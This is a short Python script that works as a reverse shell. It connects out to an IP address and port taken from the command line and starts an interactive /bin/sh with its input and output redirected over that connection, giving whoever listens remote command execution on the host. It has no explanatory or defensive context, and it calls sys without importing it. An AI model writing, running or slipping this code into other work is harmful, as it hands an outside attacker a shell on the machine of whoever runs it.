import socket
import subprocess


IP = sys.argv[1]
PORT = int(sys.argv[2])


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.connect((IP, PORT))


proc = subprocess.Popen(["/bin/sh", "-i"],
                        stdin=s.fileno(),
                        stdout=s.fileno(),
                        stderr=s.fileno())
